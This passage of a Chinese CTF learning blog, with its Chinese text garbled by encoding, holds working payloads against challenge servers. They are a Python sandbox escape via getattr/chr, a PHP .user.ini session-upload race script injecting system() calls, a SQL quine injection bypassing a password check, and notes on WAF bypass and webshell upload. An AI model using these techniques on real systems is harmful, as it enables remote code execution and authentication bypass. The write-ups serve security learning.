<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q=kiword</span><br></pre></td></tr></table></figure>

<p>å¯è§æœ€åçš„kiwordæ˜¯<code>chr</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221805629.png" alt="image-20240222180522602"></p>
<p>å°±å¯ä»¥åˆ©ç”¨<code>getattr</code>æ‹¼å‡‘å‡ºå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattr(__builtins__,kiword)-&gt;__builtins__.chr</span><br><span class="line">getattr(__builtins__,kiword)(97)-&gt;__builtins__.chr(97)-&gt;a</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ‹¼å‡º<code>__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(105)+getattr(__builtins__,kiword)(109)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(114)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)</span><br><span class="line">-&gt;</span><br><span class="line">__import__</span><br><span class="line"></span><br><span class="line">getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(115)</span><br><span class="line">-&gt;</span><br><span class="line">os</span><br><span class="line"></span><br><span class="line">getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(101)+getattr(__builtins__,kiword)(110)</span><br><span class="line">-&gt;</span><br><span class="line">popen</span><br><span class="line"></span><br><span class="line">getattr(__builtins__,kiword)(108)+getattr(__builtins__,kiword)(115)</span><br><span class="line">-&gt;</span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">getattr(getattr(__builtins__,getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(105)+getattr(__builtins__,kiword)(109)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(114)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95))(getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(115)),getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(101)+getattr(__builtins__,kiword)(110))(getattr(__builtins__,kiword)(108)+getattr(__builtins__,kiword)(115)).read()</span><br><span class="line"></span><br><span class="line">-urlencode&gt;</span><br><span class="line"></span><br><span class="line">getattr(getattr(__builtins__%2Cgetattr(__builtins__%2Ckiword)(95)%2Bgetattr(__builtins__%2Ckiword)(95)%2Bgetattr(__builtins__%2Ckiword)(105)%2Bgetattr(__builtins__%2Ckiword)(109)%2Bgetattr(__builtins__%2Ckiword)(112)%2Bgetattr(__builtins__%2Ckiword)(111)%2Bgetattr(__builtins__%2Ckiword)(114)%2Bgetattr(__builtins__%2Ckiword)(116)%2Bgetattr(__builtins__%2Ckiword)(95)%2Bgetattr(__builtins__%2Ckiword)(95))(getattr(__builtins__%2Ckiword)(111)%2Bgetattr(__builtins__%2Ckiword)(115))%2Cgetattr(__builtins__%2Ckiword)(112)%2Bgetattr(__builtins__%2Ckiword)(111)%2Bgetattr(__builtins__%2Ckiword)(112)%2Bgetattr(__builtins__%2Ckiword)(101)%2Bgetattr(__builtins__%2Ckiword)(110))(getattr(__builtins__%2Ckiword)(100)%2Bgetattr(__builtins__%2Ckiword)(105)%2Bgetattr(__builtins__%2Ckiword)(114)).read()</span><br></pre></td></tr></table></figure>

<h2 id="åŸè°…6-web3"><a href="#åŸè°…6-web3" class="headerlink" title="åŸè°…6_web3"></a>åŸè°…6_web3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;waf.php&#x27;);</span><br><span class="line">$file = $_GET[&#x27;file&#x27;] ?? NULL;</span><br><span class="line">$content = $_POST[&#x27;content&#x27;] ?? NULL;</span><br><span class="line">(waf_file($file)&amp;&amp;waf_content($content))?(file_put_contents($file,$content)):NULL;</span><br></pre></td></tr></table></figure>

<p>åšæ³•å’Œeasyshellçš„æ³•äºŒä¸€æ ·ï¼ŒåŒ…å«ä¸€ä¸ªsession_upload_progressæ–‡ä»¶</p>
<p>å…ˆåˆ›å»ºä¸€ä¸ª<code>.user.ini</code>æ–‡ä»¶ï¼Œå†…å®¹å†™ä¸Š<code>auto_prepend_file=/tmp/sess_whoami</code>ï¼Œç›®çš„æ˜¯åŒ…å«åé¢session_uploadåˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶</p>
<p>sess_whoamiçš„å¤§æ¦‚å†…å®¹å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload_progress_payload|a:5:&#123;s:10:&quot;start_time&quot;;i:1709120605;s:14:&quot;content_length&quot;;i:51482;s:15:&quot;bytes_processed&quot;;i:5259;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:5:&quot;q.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1709120605;s:15:&quot;bytes_processed&quot;;i:5259;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åpostä¼ æ–‡ä»¶ã€‚åœ¨<code>PHP_SESSION_UPLOAD_PROGRESS</code>å­—æ®µä¸Šæ‰“payload<code>&lt;?php system(&#39;ls&#39;);?&gt;</code></p>
<p>åœ¨è®¿é—®æ–‡ä»¶çš„æ—¶å€™ï¼Œç”±äº<code>.user.ini</code>çš„å­˜åœ¨ï¼Œæ¯ä¸ªphpå‰é¢ä¼šè‡ªåŠ¨<code>&quot;include&quot; sess_whoami</code>ï¼Œä»è€Œå¯¼è‡´payloadè¢«è§£æ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = &#x27;whoami&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">        session.post(</span><br><span class="line">            &#x27;http://705ad190-80a4-407f-a8d5-aade316283da.challenge.ctf.show/&#x27;,</span><br><span class="line">            data=&#123;</span><br><span class="line">                &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system(&#x27;base64 waf.php&#x27;);?&gt;&quot;&#125;,</span><br><span class="line">            files=&#123;&quot;file&quot;: (&#x27;q.txt&#x27;, f)&#125;,</span><br><span class="line">            cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    while True:</span><br><span class="line">        resp = session.get(&quot;http://705ad190-80a4-407f-a8d5-aade316283da.challenge.ctf.show/&quot;)</span><br><span class="line">        if &quot;q.txt&quot; in resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">event = threading.Event()</span><br><span class="line">with requests.session() as session:</span><br><span class="line">    payload = &#123;</span><br><span class="line">        &quot;content&quot;: &quot;auto_prepend_file=/tmp/sess_&quot; + sessid</span><br><span class="line">    &#125;</span><br><span class="line">    session.post(&quot;http://705ad190-80a4-407f-a8d5-aade316283da.challenge.ctf.show/?file=.user.ini&quot;, data=payload)</span><br><span class="line">    for i in range(1, 30):</span><br><span class="line">        threading.Thread(target=POST, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">    for i in range(1, 30):</span><br><span class="line">        threading.Thread(target=READ, args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>sql_quineæ³¨å…¥è®°å½•</title>
    <url>/2023/09/20/sql_quine%E6%B3%A8%E5%85%A5%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™ä¸ªç‚¹ä¹‹å‰ä»æ¥æ²¡è§è¿‡ï¼Œè¿˜æ˜¯ä½ é¾™å“¥åœ¨çœ‹æˆ‘åšsqlçš„é¢˜è·Ÿæˆ‘æäº†ä¸€å˜´ï¼Œçœ‹äº†ä¸€ä¸‹ç¡®å®æŒºç‰›é€¼çš„ï¼Œæ•…è®°å½•ä¸€ä¸‹</p>
<h1 id="æ­£ç‰‡"><a href="#æ­£ç‰‡" class="headerlink" title="æ­£ç‰‡"></a>æ­£ç‰‡</h1><p>ç›´æ¥æŠŠé¢˜æ‹¿å‡ºæ¥çœ‹ï¼Œå…¶å®æš‚æ—¶ä¸ç”¨æ€ä¹ˆçœ‹ï¼Œå¤§æ¦‚çŸ¥é“ä¸€ä¸‹å°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">if ($username !== &#x27;admin&#x27;) &#123;</span><br><span class="line">    alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">checkSql($password);</span><br><span class="line">$sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">$user_result=mysqli_query($con,$sql);</span><br><span class="line">$row = mysqli_fetch_array($user_result);</span><br><span class="line">if (!$row) &#123;</span><br><span class="line">    alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">	die($FLAG);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®è¦æ±‚æ•°æ®åº“é‡Œçš„passwordå’Œä¼ å…¥çš„psdå¼ºç›¸ç­‰ï¼Œçˆ†äº†ä¹‹åå‘ç°æ•°æ®åº“ä¸­çš„passwordæ˜¯ç©ºè¡¨ã€‚çœ‹ä¼¼å°±æ²¡æœ‰ä»»ä½•åŠæ³•åšåˆ°ç›¸ç­‰ç„¶åå‡ºflagäº†ã€‚</p>
<p>ä½†æ˜¯æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥</p>
<h2 id="ä»€ä¹ˆæ˜¯Quine"><a href="#ä»€ä¹ˆæ˜¯Quine" class="headerlink" title="ä»€ä¹ˆæ˜¯Quine"></a>ä»€ä¹ˆæ˜¯Quine</h2><p>Quineå°±æ˜¯è¾“å…¥å’Œè¾“å‡ºçš„è¯­å¥å®Œå…¨ä¸€è‡´ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;this is in</span><br><span class="line">&gt;&gt;this is in</span><br></pre></td></tr></table></figure>

<p>å¦‚æœèƒ½åšåˆ°è¿™æ ·ï¼Œä½¿ç”¨æŸç§åŠæ³•å°†è¾“å…¥çš„å†…å®¹åŸå°ä¸åŠ¨è¾“å‡ºå‡ºæ¥ï¼Œå°±å®Œæˆäº†ä¸€æ¬¡Quineæ„é€ </p>
<p>åœ¨sqlä¸­èƒ½åˆ©ç”¨replaceå‡½æ•°åšåˆ°Quineæ„é€ </p>
<blockquote>
<p>replace()å‡½æ•°</p>
<p>replace(object,search,replace) æŠŠobjectå¯¹è±¡ä¸­å‡ºç°çš„searchå…¨éƒ¨æ›¿æ¢æˆreplace</p>
</blockquote>
<p>æ„é€ çš„åŸºæœ¬å½¢å¼å°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REPLACE(str,ç¼–ç çš„é—´éš”ç¬¦,str)</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ï¼Œsträ¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REPLACE(é—´éš”ç¬¦,ç¼–ç çš„é—´éš”ç¬¦,é—´éš”ç¬¦)</span><br></pre></td></tr></table></figure>

<p>ç»„åˆå°±å˜æˆäº†&#x3D;&#x3D;&gt;</p>
<blockquote>
<p>REPLACE(<span style="color:red">REPLACE(é—´éš”ç¬¦,ç¼–ç çš„é—´éš”ç¬¦,é—´éš”ç¬¦)</span>,ç¼–ç çš„é—´éš”ç¬¦,<span style="color:blue">REPLACE(é—´éš”ç¬¦,ç¼–ç çš„é—´éš”ç¬¦,é—´éš”ç¬¦)</span>)<br>                            â†‘str1																						â†‘str2</p>
</blockquote>
<p>è¿™æ ·å°±æŠŠstr1ä¸­çš„é—´éš”ç¬¦åˆæ¢æˆäº†str2ï¼Œå…·ä½“çš„æ›¿æ¢ç”¨é¢œè‰²è¡¨ç¤ºä¸€ä¸‹</p>
<blockquote>
<p><span style="color:red">REPLACE(<span style="color:blue">REPLACE(é—´éš”ç¬¦,ç¼–ç çš„é—´éš”ç¬¦,é—´éš”ç¬¦)</span>,ç¼–ç çš„é—´éš”ç¬¦,<span style="color:blue">REPLACE(é—´éš”ç¬¦,ç¼–ç çš„é—´éš”ç¬¦,é—´éš”ç¬¦)</span>)</span></p>
</blockquote>
<p>å¯ä»¥è§å¾—ï¼Œè¿™æ ·æ›¿æ¢ä¹‹åçš„å†…å®¹å°±å¤§è‡´ç›¸åŒäº†</p>
<p>ç›´æ¥ç»™å‡ºä¸€æ¡è¯­å¥è¯•ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select REPLACE(&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| REPLACE(&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| REPLACE(&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;,CHAR(46),&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>ç»†è‡´çœ‹ä¸€ä¸‹ï¼Œè¿˜æ˜¯æœ‰å•åŒå¼•å·çš„åŒºåˆ«ã€‚ä¸èƒ½ä¸€ç›´ç”¨åŒå¼•å·<code>&quot;</code>ï¼Œä¼šå¯¼è‡´å¼‚å¸¸é—­åˆï¼Œæ‰€ä»¥å¾—å•å¼•å·é‡ŒåµŒå¥—åŒå¼•å·ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quine: REPLACE(&#x27;str&#x27;,ç¼–ç çš„é—´éš”ç¬¦,&#x27;str&#x27;)</span><br><span class="line">str: REPLACE(&quot;é—´éš”ç¬¦&quot;,ç¼–ç çš„é—´éš”ç¬¦,&quot;é—´éš”ç¬¦&quot;)</span><br></pre></td></tr></table></figure>

<p>è¿ç®—åçš„ç»“æœæ˜¯<code>REPLACE(&quot;str&quot;,ç¼–ç çš„é—´éš”ç¬¦,&quot;str&quot;)</code>ï¼Œæ‰€ä»¥è®©ç»“æœçš„strä¹Ÿç”¨å•å¼•å·åŒ…è£¹å°±èƒ½è®©è¾“å…¥å’ŒæŸ¥è¯¢ç»“æœå®Œå…¨ä¸€è‡´äº†</p>
<p>é‚£è¦å¦‚ä½•è§£å†³ä½†åŒå¼•å·ä¸ä¸€è‡´çš„é—®é¢˜å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œå†replaceä¸€ä¸‹å°±å¥½äº†ã€‚<code>CHAR(34)=&quot;</code>ï¼Œ<code>CHAR(39)=&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quine:REPLACE(REPLACE(&#x27;str&#x27;,CHAR(34),CHAR(39)),ç¼–ç çš„é—´éš”ç¬¦,&#x27;str&#x27;)</span><br><span class="line">  str:REPLACE(REPLACE(&quot;é—´éš”ç¬¦&quot;,CHAR(34),CHAR(39)),ç¼–ç çš„é—´éš”ç¬¦,&quot;é—´éš”ç¬¦&quot;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å®é™…ä¸Šæ˜¯å…ˆå°†stré‡Œçš„åŒå¼•å·æ›¿æ¢æˆå•å¼•å·ï¼Œå†ç”¨stræ›¿æ¢stré‡Œçš„é—´éš”ç¬¦</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<h2 id="å†ä»payloadç†è§£ä¸ºä»€ä¹ˆè¦ç”¨Quine"><a href="#å†ä»payloadç†è§£ä¸ºä»€ä¹ˆè¦ç”¨Quine" class="headerlink" title="å†ä»payloadç†è§£ä¸ºä»€ä¹ˆè¦ç”¨Quine"></a>å†ä»payloadç†è§£ä¸ºä»€ä¹ˆè¦ç”¨Quine</h2><p>ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet_another_mysql_injection</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">if ($username !== &#x27;admin&#x27;) &#123;</span><br><span class="line">    alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">checkSql($password);</span><br><span class="line">$sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">$user_result=mysqli_query($con,$sql);</span><br><span class="line">$row = mysqli_fetch_array($user_result);</span><br><span class="line">if (!$row) &#123;</span><br><span class="line">    alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">	die($FLAG);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wafå°äº†ç©ºæ ¼ï¼Œç›´æ¥ç”¨å†…è”å°±è¡Œäº†ã€‚è¿™é‡Œä¸ºäº†æ–¹ä¾¿çœ‹å°±ç”¨å›ç©ºæ ¼</p>
<blockquote>
<p>1â€™ union select replace(replace(â€˜1â€ union select replace(replace(â€œ.â€,char(34),char(39)),char(46),â€.â€)#â€™,char(34),char(39)),char(46),â€™1â€ union select replace(replace(â€œ.â€,char(34),char(39)),char(46),â€.â€)#â€™)#<br>ç»„åˆsqlè¯­å¥å°±æ˜¯ï¼š<br>SELECT password FROM users WHERE username&#x3D;â€™adminâ€™ and password&#x3D;â€™1â€™ union select replace(replace(â€˜1â€ union select replace(replace(â€œ.â€,char(34),char(39)),char(46),â€.â€)#â€™,char(34),char(39)),char(46),â€™1â€ union select replace(replace(â€œ.â€,char(34),char(39)),char(46),â€.â€)#â€™)#â€™;</p>
</blockquote>
<p>è¿™æ—¶å€™ï¼Œç”±äºä½¿ç”¨çš„æ˜¯è”åˆæ³¨å…¥ï¼Œå½“å‰æ–‡æŠ¥é”™ï¼Œå°±ä¼šå›æ˜¾åé¢çš„</p>
<blockquote>
<p>1â€™ union select replace(replace(â€˜1â€ union select replace(replace(â€œ.â€,char(34),char(39)),char(46),â€.â€)#â€™,char(34),char(39)),char(46),â€™1â€ union select replace(replace(â€œ.â€,char(34),char(39)),char(46),â€.â€)#â€™)#â€™;</p>
</blockquote>
<p>è¿™å°±è®©$row[â€˜passwordâ€™] ç­‰äºäº†è¿™ä¸€ä¸²ï¼Œè€Œè¿™ä¸€ä¸²åˆšå¥½å’Œè¾“å…¥çš„$pswç›¸ç­‰ï¼Œå®Œæˆäº†ç»•è¿‡</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>webå®‰å…¨</title>
    <url>/2023/02/18/web%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h3 id="level0"><a href="#level0" class="headerlink" title="level0:"></a>level0:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455944.png" alt="image-20221211231711676"></p>
<p>åº•éƒ¨çœ‹åˆ°æœ‰æç¤ºï¼Œæ„é€ getæ–¹æ³•cat&#x3D;dogè¯•è¯•</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455523.png" alt="image-20221211231756648"></p>
<h3 id="level1"><a href="#level1" class="headerlink" title="level1:"></a>level1:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455163.png" alt="image-20221211233520721"></p>
<p>æºæ–‡ä»¶æç¤ºæœ‰ä¸ªcalc.phpé¡µé¢ï¼Œç”¨getæ–¹æ³•ä¼ å…¥numæ¥è®¡ç®—ï¼Œä½†æ˜¯æœ‰WAFæŒ¡ç€</p>
<p>åˆ†åˆ«ä¼ å…¥æ•°å­—å’Œå­—æ¯ï¼Œå‘ç°ä¼ å­—æ¯ä¼šè¢«æ‹¦æˆª</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456037.png" alt="image-20221211233707884"></p>
<p>å‚è€ƒï¼š[<a href="https://www.cnblogs.com/sfsec/p/15205011.html">RoarCTF 2019]Easy Calc - éšé£kali - åšå®¢å›­ (cnblogs.com)</a></p>
<p>å¯çŸ¥åœ¨numå‚æ•°å‰åŠ ç©ºæ ¼ï¼Œå¯ä»¥è®©WAFæ£€æµ‹ä¸åˆ°numå‚æ•°çš„åŒæ—¶ä¼ å…¥numå‚æ•°</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456539.png" alt="image-20221211233843529"></p>
<p>é‚£å°±ç”¨phpçš„scandir()å‡½æ•°ï¼Œåˆ—å‡ºç›®å½•ã€‚ä½†é»‘åå•æ˜¯åŒ…å«äº†â€&#x2F;â€œçš„</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456850.png" alt="image-20221211234126984"></p>
<p>å°±ç”¨chr(47)æ›¿æ¢</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456540.png" alt="image-20221211234145597"></p>
<p>æ•ˆæœå¦‚ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456060.png" alt="image-20221211234208952"></p>
<p>åŒç†ï¼Œæ¢ç”¨file_get_contents()å‡½æ•°æ˜¾ç¤ºf1aggå†…å®¹ï¼Œç”±äºé»‘åå•æ²¡æœ‰æ»¤è¿‡f,1,a,gå­—ç¬¦ï¼Œæ‰€ä»¥ç›´æ¥ä¼ å°±å¯ä»¥äº†ï¼Œä¸ç”¨æ¢æˆascii</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456522.png" alt="image-20221211234546925"></p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2:"></a>level2:</h3><p>çœ‹æºç ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456535.png" alt="image-20221212000343880"></p>
<p>è¦æ±‚ç”¨postä¼ å…¥password &#x3D;&#x3D; 404ä½†åˆä¸èƒ½æ˜¯æ•°å­—ï¼Œmoney &#x3D;&#x3D; 100000000</p>
<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_50597969/article/details/115492810">phpä¸­is_numericå‡½æ•°çš„ç»•è¿‡_T0mrvvi1b3tçš„åšå®¢-CSDNåšå®¢_is_numericç»•è¿‡</a></p>
<p>ä»¤password&#x3D;404a</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456925.png" alt="image-20221212001843684"></p>
<p>å°†GETæ”¹POSTçš„æ—¶å€™è®°å¾—åŠ :Content-Type: application&#x2F;x-www-form-urlencoded</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457037.png" alt="image-20221212001919297"></p>
<p>æç¤ºå¤ªé•¿äº†ï¼Œæ¢ç”¨ç§‘å­¦è®¡æ•°æ³•</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457799.png" alt="image-20221212002214750"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457132.png" alt="image-20221212002218962"></p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h3><p>è¿˜æ²¡å­¦ä¼šsqlæ³¨å…¥ï¼Œæš‚æ—¶ä¸åš</p>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h3><p>æœ‰ç‚¹åƒæ–°ç”Ÿæ¯çš„EZuploadï¼Œä½†æ›´ç®€å•</p>
<p>æ³¨æ„åˆ°åªèƒ½ä¼ jpgä¸Šå»ï¼Œé‚£å°±ç”¨.htaccessç»•è¿‡ï¼Œç„¶åä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p>
<p>è¿˜æ²¡æœ‰å†…å®¹æ£€æµ‹ï¼Œä¸ç”¨å˜å½¢é©¬</p>
<p>åœ¨æ ¹ç›®å½•æœ‰ç°æˆflagï¼Œè€Œä¸”æƒé™è¶³å¤Ÿï¼Œä¸éœ€è¦åœ¨æ–°ç”Ÿæ¯ä¸€æ ·ç”¨diasble_functionæ’ä»¶ç»•è¿‡</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457008.png" alt="image-20221212011021115"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¼ å…¥æ–‡ä»¶</title>
    <url>/2022/11/21/%E4%BC%A0%E5%85%A5%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>è®°å½•ä¸€ä¸‹windowsç¯å¢ƒä¸‹ç”¨æ‰¹å¤„ç†æŸ¥çœ‹ä¼ å…¥çš„æ–‡ä»¶è¯¦æƒ…</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211101622522.png" alt="image-20221110162240500"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off </span><br><span class="line">	echo æ–‡ä»¶å…¨è·¯å¾„ï¼š	%1</span><br><span class="line">	echo çŸ­è·¯å¾„åï¼š	%~s1</span><br><span class="line">	echo ç›˜ç¬¦+è·¯å¾„ï¼š	%~dp1</span><br><span class="line">	echo ç›˜ç¬¦ï¼š		%~d1</span><br><span class="line">	echo è·¯å¾„ï¼š		%~p1</span><br><span class="line">	echo æ–‡ä»¶+åç¼€åï¼š	%~nx1</span><br><span class="line">	echo æ–‡ä»¶åï¼š		%~n1</span><br><span class="line">	echo åç¼€åï¼š		%~x1</span><br><span class="line">	echo æ–‡ä»¶å±æ€§ï¼š	%~a1</span><br><span class="line">	echo æ—¥æœŸ/æ—¶é—´ï¼š	%~t1</span><br><span class="line">	echo æ–‡ä»¶å¤§å°ï¼š	%~z1</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<p>æ‹–å…¥æ–‡ä»¶å¦‚ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211101623462.png" alt="image-20221110162318445"></p>
]]></content>
      <categories>
        <category>æ€ªä¸œè¥¿</category>
      </categories>
      <tags>
        <tag>å…¶ä»–</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆå¹¶flvæ–‡ä»¶</title>
    <url>/2022/11/21/%E5%90%88%E5%B9%B6flv/</url>
    <content><![CDATA[<p>æ¥æºäºæˆ‘å‚»é€¼è®¾ç½®æŠŠæ¯ä¸ªè§†é¢‘åˆ‡æˆ10mbçš„å°è§†é¢‘äº†ï¼Œéœ€è¦åˆå¹¶</p>
<p>é¦–å…ˆå®‰è£…FFmpeg</p>
<p>å…ˆæŠŠæ‰€éœ€çš„æ‰€æœ‰è§†é¢‘ä¸‹ä¸‹æ¥ï¼ŒæŒ‰å…ˆåé¡ºåºæ’åˆ—</p>
